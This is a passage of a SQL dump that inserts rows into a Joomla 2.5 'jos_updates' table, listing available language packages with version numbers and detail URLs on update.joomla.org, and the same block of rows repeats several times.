(320, 3, 0, 0, 'Bahasa Indonesia', '', 'pkg_id-ID', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/id-ID_details.xml', ''),
(321, 3, 0, 0, 'Danish', '', 'pkg_da-DK', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/da-DK_details.xml', ''),
(322, 3, 0, 0, 'Swedish', '', 'pkg_sv-SE', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/sv-SE_details.xml', ''),
(323, 3, 0, 0, 'Hungarian', '', 'pkg_hu-HU', 'package', '', 0, '2.5.14.1', '', 'http://update.joomla.org/language/details/hu-HU_details.xml', ''),
(324, 3, 0, 0, 'French', '', 'pkg_fr-FR', 'package', '', 0, '2.5.28.2', '', 'http://update.joomla.org/language/details/fr-FR_details.xml', ''),
(325, 3, 0, 0, 'Italian', '', 'pkg_it-IT', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/it-IT_details.xml', ''),
(326, 3, 0, 0, 'Spanish', '', 'pkg_es-ES', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/es-ES_details.xml', ''),
(327, 3, 0, 0, 'Dutch', '', 'pkg_nl-NL', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/nl-NL_details.xml', ''),
(328, 3, 0, 0, 'Turkish', '', 'pkg_tr-TR', 'package', '', 0, '2.5.20.1', '', 'http://update.joomla.org/language/details/tr-TR_details.xml', ''),
(329, 3, 0, 0, 'Slovak', '', 'pkg_sk-SK', 'package', '', 0, '2.5.27.1', '', 'http://update.joomla.org/language/details/sk-SK_details.xml', ''),
(330, 3, 0, 0, 'Latvian', '', 'pkg_lv-LV', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/lv-LV_details.xml', ''),
(331, 3, 0, 0, 'Estonian', '', 'pkg_et-EE', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/et-EE_details.xml', ''),
(332, 3, 0, 0, 'Flemish', '', 'pkg_nl-BE', 'package', '', 0, '2.5.27.1', '', 'http://update.joomla.org/language/details/nl-BE_details.xml', ''),
(333, 3, 0, 0, 'Macedonian', '', 'pkg_mk-MK', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/mk-MK_details.xml', ''),
(334, 3, 0, 0, 'Japanese', '', 'pkg_ja-JP', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/ja-JP_details.xml', ''),
(335, 3, 0, 0, 'Serbian Latin', '', 'pkg_sr-YU', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/sr-YU_details.xml', ''),
(336, 3, 0, 0, 'Arabic Unitag', '', 'pkg_ar-AA', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/ar-AA_details.xml', ''),
(337, 3, 0, 0, 'German', '', 'pkg_de-DE', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/de-DE_details.xml', ''),
(338, 3, 0, 0, 'Norwegian Bokmal', '', 'pkg_nb-NO', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/nb-NO_details.xml', ''),
(339, 3, 0, 0, 'English AU', '', 'pkg_en-AU', 'package', '', 0, '2.5.22.2', '', 'http://update.joomla.org/language/details/en-AU_details.xml', ''),
(340, 3, 0, 0, 'English US', '', 'pkg_en-US', 'package', '', 0, '2.5.22.1', '', 'http://update.joomla.org/language/details/en-US_details.xml', ''),
(341, 3, 0, 0, 'Serbian Cyrillic', '', 'pkg_sr-RS', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/sr-RS_details.xml', ''),
(342, 3, 0, 0, 'Czech', '', 'pkg_cs-CZ', 'package', '', 0, '2.5.28.2', '', 'http://update.joomla.org/language/details/cs-CZ_details.xml', ''),
(343, 3, 0, 0, 'Persian', '', 'pkg_fa-IR', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/fa-IR_details.xml', ''),
(344, 3, 0, 0, 'Polish', '', 'pkg_pl-PL', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/pl-PL_details.xml', ''),
(345, 3, 0, 0, 'Syriac', '', 'pkg_sy-IQ', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/sy-IQ_details.xml', ''),
(346, 3, 0, 0, 'Portuguese', '', 'pkg_pt-PT', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/pt-PT_details.xml', ''),
(347, 3, 0, 0, 'Russian', '', 'pkg_ru-RU', 'package', '', 0, '2.5.24.1', '', 'http://update.joomla.org/language/details/ru-RU_details.xml', ''),
(348, 3, 0, 0, 'Catalan', '', 'pkg_ca-ES', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/ca-ES_details.xml', ''),
(349, 3, 0, 0, 'Afrikaans', '', 'pkg_af-ZA', 'package', '', 0, '2.5.16.1', '', 'http://update.joomla.org/language/details/af-ZA_details.xml', ''),
(350, 3, 0, 0, 'Chinese Simplified', '', 'pkg_zh-CN', 'package', '', 0, '2.5.20.1', '', 'http://update.joomla.org/language/details/zh-CN_details.xml', ''),
(351, 3, 0, 0, 'Finnish', '', 'pkg_fi-FI', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/fi-FI_details.xml', '');
INSERT INTO `jos_updates` (`update_id`, `update_site_id`, `extension_id`, `categoryid`, `name`, `description`, `element`, `type`, `folder`, `client_id`, `version`, `data`, `detailsurl`, `infourl`) VALUES
(352, 3, 0, 0, 'Chinese Traditional', '', 'pkg_zh-TW', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/zh-TW_details.xml', ''),
(353, 3, 0, 0, 'Bosnian', '', 'pkg_bs-BA', 'package', '', 0, '2.5.24.1', '', 'http://update.joomla.org/language/details/bs-BA_details.xml', ''),
(354, 3, 0, 0, 'Tamil India', '', 'pkg_ta-IN', 'package', '', 0, '2.5.28.2', '', 'http://update.joomla.org/language/details/ta-IN_details.xml', ''),
(355, 3, 0, 0, 'Thai', '', 'pkg_th-TH', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/th-TH_details.xml', ''),
(356, 3, 0, 0, 'Swahili', '', 'pkg_sw-KE', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/sw-KE_details.xml', ''),
(357, 1, 0, 0, 'Joomla', '', 'joomla', 'file', '', 0, '2.5.28', '', 'https://update.joomla.org/core/extension.xml', ''),
(358, 3, 0, 0, 'Armenian', '', 'pkg_hy-AM', 'package', '', 0, '2.5.28.3', '', 'http://update.joomla.org/language/details/hy-AM_details.xml', ''),
(359, 3, 0, 0, 'Bahasa Indonesia', '', 'pkg_id-ID', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/id-ID_details.xml', ''),
(360, 3, 0, 0, 'Danish', '', 'pkg_da-DK', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/da-DK_details.xml', ''),
(361, 3, 0, 0, 'Swedish', '', 'pkg_sv-SE', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/sv-SE_details.xml', ''),
(362, 3, 0, 0, 'Hungarian', '', 'pkg_hu-HU', 'package', '', 0, '2.5.14.1', '', 'http://update.joomla.org/language/details/hu-HU_details.xml', ''),
(363, 3, 0, 0, 'French', '', 'pkg_fr-FR', 'package', '', 0, '2.5.28.2', '', 'http://update.joomla.org/language/details/fr-FR_details.xml', ''),
(364, 3, 0, 0, 'Italian', '', 'pkg_it-IT', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/it-IT_details.xml', ''),
(365, 3, 0, 0, 'Spanish', '', 'pkg_es-ES', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/es-ES_details.xml', ''),
(366, 3, 0, 0, 'Dutch', '', 'pkg_nl-NL', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/nl-NL_details.xml', ''),
(367, 3, 0, 0, 'Turkish', '', 'pkg_tr-TR', 'package', '', 0, '2.5.20.1', '', 'http://update.joomla.org/language/details/tr-TR_details.xml', ''),
(368, 3, 0, 0, 'Slovak', '', 'pkg_sk-SK', 'package', '', 0, '2.5.27.1', '', 'http://update.joomla.org/language/details/sk-SK_details.xml', ''),
(369, 3, 0, 0, 'Latvian', '', 'pkg_lv-LV', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/lv-LV_details.xml', ''),
(370, 3, 0, 0, 'Estonian', '', 'pkg_et-EE', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/et-EE_details.xml', ''),
(371, 3, 0, 0, 'Flemish', '', 'pkg_nl-BE', 'package', '', 0, '2.5.27.1', '', 'http://update.joomla.org/language/details/nl-BE_details.xml', ''),
(372, 3, 0, 0, 'Macedonian', '', 'pkg_mk-MK', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/mk-MK_details.xml', ''),
(373, 3, 0, 0, 'Japanese', '', 'pkg_ja-JP', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/ja-JP_details.xml', ''),
(374, 3, 0, 0, 'Serbian Latin', '', 'pkg_sr-YU', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/sr-YU_details.xml', ''),
(375, 3, 0, 0, 'Arabic Unitag', '', 'pkg_ar-AA', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/ar-AA_details.xml', ''),
(376, 3, 0, 0, 'German', '', 'pkg_de-DE', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/de-DE_details.xml', ''),
(377, 3, 0, 0, 'Norwegian Bokmal', '', 'pkg_nb-NO', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/nb-NO_details.xml', ''),
(378, 3, 0, 0, 'English AU', '', 'pkg_en-AU', 'package', '', 0, '2.5.22.2', '', 'http://update.joomla.org/language/details/en-AU_details.xml', ''),
(379, 3, 0, 0, 'English US', '', 'pkg_en-US', 'package', '', 0, '2.5.22.1', '', 'http://update.joomla.org/language/details/en-US_details.xml', ''),
(380, 3, 0, 0, 'Serbian Cyrillic', '', 'pkg_sr-RS', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/sr-RS_details.xml', ''),
(381, 3, 0, 0, 'Czech', '', 'pkg_cs-CZ', 'package', '', 0, '2.5.28.2', '', 'http://update.joomla.org/language/details/cs-CZ_details.xml', ''),
(382, 3, 0, 0, 'Persian', '', 'pkg_fa-IR', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/fa-IR_details.xml', ''),
(383, 3, 0, 0, 'Polish', '', 'pkg_pl-PL', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/pl-PL_details.xml', ''),
(384, 3, 0, 0, 'Syriac', '', 'pkg_sy-IQ', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/sy-IQ_details.xml', ''),
(385, 3, 0, 0, 'Portuguese', '', 'pkg_pt-PT', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/pt-PT_details.xml', ''),
(386, 3, 0, 0, 'Russian', '', 'pkg_ru-RU', 'package', '', 0, '2.5.24.1', '', 'http://update.joomla.org/language/details/ru-RU_details.xml', ''),
(387, 3, 0, 0, 'Catalan', '', 'pkg_ca-ES', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/ca-ES_details.xml', ''),
(388, 3, 0, 0, 'Afrikaans', '', 'pkg_af-ZA', 'package', '', 0, '2.5.16.1', '', 'http://update.joomla.org/language/details/af-ZA_details.xml', ''),
(389, 3, 0, 0, 'Chinese Simplified', '', 'pkg_zh-CN', 'package', '', 0, '2.5.20.1', '', 'http://update.joomla.org/language/details/zh-CN_details.xml', ''),
(390, 3, 0, 0, 'Finnish', '', 'pkg_fi-FI', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/fi-FI_details.xml', ''),
(391, 3, 0, 0, 'Chinese Traditional', '', 'pkg_zh-TW', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/zh-TW_details.xml', ''),
(392, 3, 0, 0, 'Bosnian', '', 'pkg_bs-BA', 'package', '', 0, '2.5.24.1', '', 'http://update.joomla.org/language/details/bs-BA_details.xml', ''),
(393, 3, 0, 0, 'Tamil India', '', 'pkg_ta-IN', 'package', '', 0, '2.5.28.2', '', 'http://update.joomla.org/language/details/ta-IN_details.xml', ''),
(394, 3, 0, 0, 'Thai', '', 'pkg_th-TH', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/th-TH_details.xml', ''),
(395, 3, 0, 0, 'Swahili', '', 'pkg_sw-KE', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/sw-KE_details.xml', ''),
(396, 1, 0, 0, 'Joomla', '', 'joomla', 'file', '', 0, '2.5.28', '', 'https://update.joomla.org/core/extension.xml', ''),
(397, 3, 0, 0, 'Armenian', '', 'pkg_hy-AM', 'package', '', 0, '2.5.28.3', '', 'http://update.joomla.org/language/details/hy-AM_details.xml', ''),
(398, 3, 0, 0, 'Bahasa Indonesia', '', 'pkg_id-ID', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/id-ID_details.xml', ''),
(399, 3, 0, 0, 'Danish', '', 'pkg_da-DK', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/da-DK_details.xml', ''),
(400, 3, 0, 0, 'Swedish', '', 'pkg_sv-SE', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/sv-SE_details.xml', ''),
(401, 3, 0, 0, 'Hungarian', '', 'pkg_hu-HU', 'package', '', 0, '2.5.14.1', '', 'http://update.joomla.org/language/details/hu-HU_details.xml', ''),
(402, 3, 0, 0, 'French', '', 'pkg_fr-FR', 'package', '', 0, '2.5.28.2', '', 'http://update.joomla.org/language/details/fr-FR_details.xml', ''),
(403, 3, 0, 0, 'Italian', '', 'pkg_it-IT', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/it-IT_details.xml', ''),
(404, 3, 0, 0, 'Spanish', '', 'pkg_es-ES', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/es-ES_details.xml', ''),
(405, 3, 0, 0, 'Dutch', '', 'pkg_nl-NL', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/nl-NL_details.xml', ''),
(406, 3, 0, 0, 'Turkish', '', 'pkg_tr-TR', 'package', '', 0, '2.5.20.1', '', 'http://update.joomla.org/language/details/tr-TR_details.xml', ''),
(407, 3, 0, 0, 'Slovak', '', 'pkg_sk-SK', 'package', '', 0, '2.5.27.1', '', 'http://update.joomla.org/language/details/sk-SK_details.xml', ''),
(408, 3, 0, 0, 'Latvian', '', 'pkg_lv-LV', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/lv-LV_details.xml', ''),
(409, 3, 0, 0, 'Estonian', '', 'pkg_et-EE', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/et-EE_details.xml', ''),
(410, 3, 0, 0, 'Flemish', '', 'pkg_nl-BE', 'package', '', 0, '2.5.27.1', '', 'http://update.joomla.org/language/details/nl-BE_details.xml', ''),
(411, 3, 0, 0, 'Macedonian', '', 'pkg_mk-MK', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/mk-MK_details.xml', ''),
(412, 3, 0, 0, 'Japanese', '', 'pkg_ja-JP', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/ja-JP_details.xml', ''),
(413, 3, 0, 0, 'Serbian Latin', '', 'pkg_sr-YU', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/sr-YU_details.xml', ''),
(414, 3, 0, 0, 'Arabic Unitag', '', 'pkg_ar-AA', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/ar-AA_details.xml', ''),
(415, 3, 0, 0, 'German', '', 'pkg_de-DE', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/de-DE_details.xml', ''),
(416, 3, 0, 0, 'Norwegian Bokmal', '', 'pkg_nb-NO', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/nb-NO_details.xml', ''),
(417, 3, 0, 0, 'English AU', '', 'pkg_en-AU', 'package', '', 0, '2.5.22.2', '', 'http://update.joomla.org/language/details/en-AU_details.xml', ''),
(418, 3, 0, 0, 'English US', '', 'pkg_en-US', 'package', '', 0, '2.5.22.1', '', 'http://update.joomla.org/language/details/en-US_details.xml', ''),
(419, 3, 0, 0, 'Serbian Cyrillic', '', 'pkg_sr-RS', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/sr-RS_details.xml', ''),
(420, 3, 0, 0, 'Czech', '', 'pkg_cs-CZ', 'package', '', 0, '2.5.28.2', '', 'http://update.joomla.org/language/details/cs-CZ_details.xml', ''),
(421, 3, 0, 0, 'Persian', '', 'pkg_fa-IR', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/fa-IR_details.xml', ''),
(422, 3, 0, 0, 'Polish', '', 'pkg_pl-PL', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/pl-PL_details.xml', ''),
(423, 3, 0, 0, 'Syriac', '', 'pkg_sy-IQ', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/sy-IQ_details.xml', ''),
(424, 3, 0, 0, 'Portuguese', '', 'pkg_pt-PT', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/pt-PT_details.xml', ''),
(425, 3, 0, 0, 'Russian', '', 'pkg_ru-RU', 'package', '', 0, '2.5.24.1', '', 'http://update.joomla.org/language/details/ru-RU_details.xml', ''),
(426, 3, 0, 0, 'Catalan', '', 'pkg_ca-ES', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/ca-ES_details.xml', ''),
(427, 3, 0, 0, 'Afrikaans', '', 'pkg_af-ZA', 'package', '', 0, '2.5.16.1', '', 'http://update.joomla.org/language/details/af-ZA_details.xml', ''),
(428, 3, 0, 0, 'Chinese Simplified', '', 'pkg_zh-CN', 'package', '', 0, '2.5.20.1', '', 'http://update.joomla.org/language/details/zh-CN_details.xml', ''),
(429, 3, 0, 0, 'Finnish', '', 'pkg_fi-FI', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/fi-FI_details.xml', ''),
(430, 3, 0, 0, 'Chinese Traditional', '', 'pkg_zh-TW', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/zh-TW_details.xml', ''),
(431, 3, 0, 0, 'Bosnian', '', 'pkg_bs-BA', 'package', '', 0, '2.5.24.1', '', 'http://update.joomla.org/language/details/bs-BA_details.xml', ''),
(432, 3, 0, 0, 'Tamil India', '', 'pkg_ta-IN', 'package', '', 0, '2.5.28.2', '', 'http://update.joomla.org/language/details/ta-IN_details.xml', ''),
(433, 3, 0, 0, 'Thai', '', 'pkg_th-TH', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/th-TH_details.xml', ''),
(434, 3, 0, 0, 'Swahili', '', 'pkg_sw-KE', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/sw-KE_details.xml', ''),
(435, 1, 0, 0, 'Joomla', '', 'joomla', 'file', '', 0, '2.5.28', '', 'https://update.joomla.org/core/extension.xml', ''),
(436, 3, 0, 0, 'Armenian', '', 'pkg_hy-AM', 'package', '', 0, '2.5.28.3', '', 'http://update.joomla.org/language/details/hy-AM_details.xml', ''),
(437, 3, 0, 0, 'Bahasa Indonesia', '', 'pkg_id-ID', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/id-ID_details.xml', ''),
(438, 3, 0, 0, 'Danish', '', 'pkg_da-DK', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/da-DK_details.xml', ''),
(439, 3, 0, 0, 'Swedish', '', 'pkg_sv-SE', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/sv-SE_details.xml', ''),
(440, 3, 0, 0, 'Hungarian', '', 'pkg_hu-HU', 'package', '', 0, '2.5.14.1', '', 'http://update.joomla.org/language/details/hu-HU_details.xml', ''),
(441, 3, 0, 0, 'French', '', 'pkg_fr-FR', 'package', '', 0, '2.5.28.2', '', 'http://update.joomla.org/language/details/fr-FR_details.xml', ''),
(442, 3, 0, 0, 'Italian', '', 'pkg_it-IT', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/it-IT_details.xml', ''),
(443, 3, 0, 0, 'Spanish', '', 'pkg_es-ES', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/es-ES_details.xml', ''),
(444, 3, 0, 0, 'Dutch', '', 'pkg_nl-NL', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/nl-NL_details.xml', ''),
(445, 3, 0, 0, 'Turkish', '', 'pkg_tr-TR', 'package', '', 0, '2.5.20.1', '', 'http://update.joomla.org/language/details/tr-TR_details.xml', ''),
(446, 3, 0, 0, 'Slovak', '', 'pkg_sk-SK', 'package', '', 0, '2.5.27.1', '', 'http://update.joomla.org/language/details/sk-SK_details.xml', ''),
(447, 3, 0, 0, 'Latvian', '', 'pkg_lv-LV', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/lv-LV_details.xml', ''),
(448, 3, 0, 0, 'Estonian', '', 'pkg_et-EE', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/et-EE_details.xml', ''),
(449, 3, 0, 0, 'Flemish', '', 'pkg_nl-BE', 'package', '', 0, '2.5.27.1', '', 'http://update.joomla.org/language/details/nl-BE_details.xml', ''),
(450, 3, 0, 0, 'Macedonian', '', 'pkg_mk-MK', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/mk-MK_details.xml', ''),
(451, 3, 0, 0, 'Japanese', '', 'pkg_ja-JP', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/ja-JP_details.xml', ''),
(452, 3, 0, 0, 'Serbian Latin', '', 'pkg_sr-YU', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/sr-YU_details.xml', ''),
(453, 3, 0, 0, 'Arabic Unitag', '', 'pkg_ar-AA', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/ar-AA_details.xml', ''),
(454, 3, 0, 0, 'German', '', 'pkg_de-DE', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/de-DE_details.xml', ''),
(455, 3, 0, 0, 'Norwegian Bokmal', '', 'pkg_nb-NO', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/nb-NO_details.xml', ''),
(456, 3, 0, 0, 'English AU', '', 'pkg_en-AU', 'package', '', 0, '2.5.22.2', '', 'http://update.joomla.org/language/details/en-AU_details.xml', ''),
(457, 3, 0, 0, 'English US', '', 'pkg_en-US', 'package', '', 0, '2.5.22.1', '', 'http://update.joomla.org/language/details/en-US_details.xml', ''),
(458, 3, 0, 0, 'Serbian Cyrillic', '', 'pkg_sr-RS', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/sr-RS_details.xml', ''),
(459, 3, 0, 0, 'Czech', '', 'pkg_cs-CZ', 'package', '', 0, '2.5.28.2', '', 'http://update.joomla.org/language/details/cs-CZ_details.xml', ''),
(460, 3, 0, 0, 'Persian', '', 'pkg_fa-IR', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/fa-IR_details.xml', ''),
(461, 3, 0, 0, 'Polish', '', 'pkg_pl-PL', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/pl-PL_details.xml', ''),
(462, 3, 0, 0, 'Syriac', '', 'pkg_sy-IQ', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/sy-IQ_details.xml', ''),
(463, 3, 0, 0, 'Portuguese', '', 'pkg_pt-PT', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/pt-PT_details.xml', ''),
(464, 3, 0, 0, 'Russian', '', 'pkg_ru-RU', 'package', '', 0, '2.5.24.1', '', 'http://update.joomla.org/language/details/ru-RU_details.xml', ''),
(465, 3, 0, 0, 'Catalan', '', 'pkg_ca-ES', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/ca-ES_details.xml', ''),
(466, 3, 0, 0, 'Afrikaans', '', 'pkg_af-ZA', 'package', '', 0, '2.5.16.1', '', 'http://update.joomla.org/language/details/af-ZA_details.xml', ''),
(467, 3, 0, 0, 'Chinese Simplified', '', 'pkg_zh-CN', 'package', '', 0, '2.5.20.1', '', 'http://update.joomla.org/language/details/zh-CN_details.xml', ''),
(468, 3, 0, 0, 'Finnish', '', 'pkg_fi-FI', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/fi-FI_details.xml', ''),
(469, 3, 0, 0, 'Chinese Traditional', '', 'pkg_zh-TW', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/zh-TW_details.xml', ''),
(470, 3, 0, 0, 'Bosnian', '', 'pkg_bs-BA', 'package', '', 0, '2.5.24.1', '', 'http://update.joomla.org/language/details/bs-BA_details.xml', ''),
(471, 3, 0, 0, 'Tamil India', '', 'pkg_ta-IN', 'package', '', 0, '2.5.28.2', '', 'http://update.joomla.org/language/details/ta-IN_details.xml', ''),
(472, 3, 0, 0, 'Thai', '', 'pkg_th-TH', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/th-TH_details.xml', ''),
(473, 3, 0, 0, 'Swahili', '', 'pkg_sw-KE', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/sw-KE_details.xml', ''),
(474, 1, 0, 0, 'Joomla', '', 'joomla', 'file', '', 0, '2.5.28', '', 'https://update.joomla.org/core/extension.xml', ''),
(475, 3, 0, 0, 'Armenian', '', 'pkg_hy-AM', 'package', '', 0, '2.5.28.3', '', 'http://update.joomla.org/language/details/hy-AM_details.xml', ''),
(476, 3, 0, 0, 'Bahasa Indonesia', '', 'pkg_id-ID', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/id-ID_details.xml', ''),
(477, 3, 0, 0, 'Danish', '', 'pkg_da-DK', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/da-DK_details.xml', ''),
(478, 3, 0, 0, 'Swedish', '', 'pkg_sv-SE', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/sv-SE_details.xml', ''),
(479, 3, 0, 0, 'Hungarian', '', 'pkg_hu-HU', 'package', '', 0, '2.5.14.1', '', 'http://update.joomla.org/language/details/hu-HU_details.xml', ''),
(480, 3, 0, 0, 'French', '', 'pkg_fr-FR', 'package', '', 0, '2.5.28.2', '', 'http://update.joomla.org/language/details/fr-FR_details.xml', ''),
(481, 3, 0, 0, 'Italian', '', 'pkg_it-IT', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/it-IT_details.xml', ''),
(482, 3, 0, 0, 'Spanish', '', 'pkg_es-ES', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/es-ES_details.xml', ''),
(483, 3, 0, 0, 'Dutch', '', 'pkg_nl-NL', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/nl-NL_details.xml', ''),
(484, 3, 0, 0, 'Turkish', '', 'pkg_tr-TR', 'package', '', 0, '2.5.20.1', '', 'http://update.joomla.org/language/details/tr-TR_details.xml', ''),
(485, 3, 0, 0, 'Slovak', '', 'pkg_sk-SK', 'package', '', 0, '2.5.27.1', '', 'http://update.joomla.org/language/details/sk-SK_details.xml', ''),
(486, 3, 0, 0, 'Latvian', '', 'pkg_lv-LV', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/lv-LV_details.xml', ''),
(487, 3, 0, 0, 'Estonian', '', 'pkg_et-EE', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/et-EE_details.xml', ''),
(488, 3, 0, 0, 'Flemish', '', 'pkg_nl-BE', 'package', '', 0, '2.5.27.1', '', 'http://update.joomla.org/language/details/nl-BE_details.xml', ''),
(489, 3, 0, 0, 'Macedonian', '', 'pkg_mk-MK', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/mk-MK_details.xml', ''),
(490, 3, 0, 0, 'Japanese', '', 'pkg_ja-JP', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/ja-JP_details.xml', ''),
(491, 3, 0, 0, 'Serbian Latin', '', 'pkg_sr-YU', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/sr-YU_details.xml', ''),
(492, 3, 0, 0, 'Arabic Unitag', '', 'pkg_ar-AA', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/ar-AA_details.xml', ''),
(493, 3, 0, 0, 'German', '', 'pkg_de-DE', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/de-DE_details.xml', ''),
(494, 3, 0, 0, 'Norwegian Bokmal', '', 'pkg_nb-NO', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/nb-NO_details.xml', ''),
(495, 3, 0, 0, 'English AU', '', 'pkg_en-AU', 'package', '', 0, '2.5.22.2', '', 'http://update.joomla.org/language/details/en-AU_details.xml', ''),
(496, 3, 0, 0, 'English US', '', 'pkg_en-US', 'package', '', 0, '2.5.22.1', '', 'http://update.joomla.org/language/details/en-US_details.xml', ''),
